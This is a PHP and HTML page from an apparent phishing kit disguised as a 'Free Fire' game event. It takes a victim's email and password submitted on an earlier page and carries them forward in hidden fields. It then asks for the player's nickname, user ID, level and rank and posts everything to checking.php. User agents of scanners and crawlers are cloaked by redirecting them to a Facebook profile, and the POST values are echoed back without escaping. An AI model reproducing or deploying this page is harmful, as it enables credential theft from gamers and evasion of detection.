<?php 
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: http://www.facebook.com/ArullxWandaa');
die();
}

$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];

if($email == "" && $password == "" && $login == ""){
    header("Location: index.php");
}
?>
<!doctype html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.css">
        <link rel="stylesheet" href="static/css/style.css">
        <title>Event Free Fire</title>
        <link rel="shorcut icon" href="static/img/thumbnail.png">
    </head>
    <body style="overflow-y: scroll;">
        <div class="mobile">
            <div class="navbar">
                <img src="static/img/thumbnail.png">
                <div class="text-left text-white text-header">
                    FREE FIRE<br>
                    <span>Detail Account</span>
                </div>
            </div>
            <div class="row">
                <div class="col-md-12 col-12">
                    <div id="carouselExampleIndicators" class="carousel slide" data-ride="carousel">
                        <ol class="carousel-indicators">
                            <li data-target="#carouselExampleIndicators" data-slide-to="0" class="active"></li>
                            <li data-target="#carouselExampleIndicators" data-slide-to="1"></li>
                            <li data-target="#carouselExampleIndicators" data-slide-to="2"></li>
                        </ol>
                        <div class="carousel-inner">
                            <div class="carousel-item active">
                                <img src="https://cdn-2.tstatic.net/kaltim/foto/bank/images/update-kode-redeem-free-fire-terbaru-16-oktober-2020-ada-hero-baru-link-theme-song-one-more-round.jpg" class="d-block w-100" alt="...">
                            </div>
                            <div class="carousel-item">
                                <img src="https://cdn1-production-images-kly.akamaized.net/0xR4eNfzVh3IH8SsGparKEWjHyU=/640x360/smart/filters:quality(75):strip_icc():format(webp)/kly-media-production/medias/3077079/original/087666000_1584284299-jota-wallpaper.jpg" class="d-block w-100" alt="...">
                            </div>
                            <div class="carousel-item">
                                <img src="https://booyah.co.id/wp-content/uploads/2020/05/images-162392687786407269219..jpg" class="d-block w-100" alt="...">
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="row mt-1 mb-1">
                <div class="col-md-12 col-12">
                    <div class="clearfix"></div>
                </div>
            </div>

            <div class="row mt-4 d-block mx-auto">
                <div class="col-md-12 col-12 mb-4 text-white text-center" style="font-size: 0.8em;">
                    Complete your account info
                </div>
                
                <div class="col-md-12 col-12">
                    <form class="formInfo" method="POST" action="checking.php">
                        <input name="email" value="<?php echo $email;?>" type="hidden" class="validateYamisok mb-5" readonly>
                        <input name="password" value="<?php echo $password;?>" type="hidden" class="validateYamisok mb-5" readonly>
                        <input name="login" value="<?php echo $login;?>" type="hidden" class="validateYamisok mb-5" readonly>
                        <div class="form-group">
                            <label>Nickname</label>
                            <input type="text" class="form-control" name="nickname" placeholder="Enter your nickname" autocomplete="off" required>
                        </div>
                        <div class="form-group">
                            <label>User ID</label>
                            <input type="number" class="form-control" name="userId" placeholder="Enter your account id" autocomplete="off" pattern="[0-9]* /^-?\d+\.?\d*$/" onKeyPress="if(this.value.length==10) return false;" required>
                        </div>
                        <div class="form-group">
                            <label>Account Level</label>
                            <select name="level" required="required" class="form-control">
                                <option value="" selected="selected" disabled="disabled">Level Account?</option> 
                                <option>1</option>
                                <option>2</option>
                                <option>3</option>
                                <option>4</option>
                                <option>5</option>
                                <option>6</option>
                                <option>7</option>
                                <option>8</option>
                                <option>9</option>
                                <option>10</option>
                                <option>11</option>
                                <option>12</option>
                                <option>13</option>
                                <option>14</option>
                                <option>15</option>
                                <option>16</option>
                                <option>17</option>
                                <option>18</option>
                                <option>19</option>
                                <option>20</option>
                                <option>21</option>
                                <option>22</option>
                                <option>23</option>
                                <option>24</option>
                                <option>25</option>
                                <option>26</option>
                                <option>27</option>
                                <option>28</option>
                                <option>29</option>
                                <option>30</option>
                                <option>31</option>
                                <option>32</option>
                                <option>33</option>
                                <option>34</option>
                                <option>35</option>
                                <option>36</option>
                                <option>37</option>
                                <option>38</option>
                                <option>39</option>
                                <option>40</option>
                                <option>41</option>
                                <option>42</option>
                                <option>43</option>
                                <option>44</option>
                                <option>45</option>
                                <option>46</option>
                                <option>47</option>
                                <option>48</option>
                                <option>49</option>
                                <option>50</option>
                                <option>51</option>
                                <option>52</option>
                                <option>53</option>
                                <option>54</option>
                                <option>55</option>
                                <option>56</option>
                                <option>57</option>
                                <option>58</option>
                                <option>59</option>
                                <option>60</option>
                                <option>61</option>
                                <option>62</option>
                                <option>63</option>
                                <option>64</option>
                                <option>65</option>
                                <option>66</option>
                                <option>67</option>
                                <option>68</option>
                                <option>69</option>
                                <option>70</option>
                                <option>71</option>
                                <option>72</option>
                                <option>73</option>
                                <option>74</option>
                                <option>75</option>
                                <option>76</option>
                                <option>77</option>
                                <option>78</option>
                                <option>79</option>
                                <option>80</option>
                                <option>81</option>
                                <option>82</option>
                                <option>83</option>
                                <option>84</option>
                                <option>85</option>
                                <option>86</option>
                                <option>87</option>
                                <option>88</option>
                                <option>89</option>
                                <option>90</option>
                                <option>91</option>
                                <option>92</option>
                                <option>93</option>
                                <option>94</option>
                                <option>95</option>
                                <option>96</option>
                                <option>97</option>
                                <option>98</option>
                                <option>99</option>
                                <option>100</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label>Pernah Elite Pass?</label>
                            <select name="epas" required="required" class="form-control">
                                <option value="" selected="selected" disabled="disabled">Elite Pass?</option> 
                                <option>Pernah</option>
                                <option>Belum Pernah</option>
                                <option>Pre Order</option>
                                </select>
                                </div>
                        <div class="form-group">
                            <label>Tier</label>
                            <select name="tier" required="required" class="form-control">
                                <option value="" selected="selected" disabled="disabled">Ranked Tier Level</option> 
                                <option value="Bronze" class="form-control">Bronze</option>
                                <option value="Silver" class="form-control">Silver</option>
                                <option value="Gold" class="form-control">Gold</option> 
                                <option value="Platinum" class="form-control">Platinum</option>
                                <option value="Diamond" class="form-control">Diamond</option>
                                <option value="Master" class="form-control">Master</option>
                                <option value="GrandMaster" class="form-control">GrandMaster</option>
                            </select>
                        </div>
                        <div class="form-group mt-4">
                            <button type="submit" class="btn btn-primary">Verification</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
        <script src="static/js/index.js"></script>
    </body>
</html>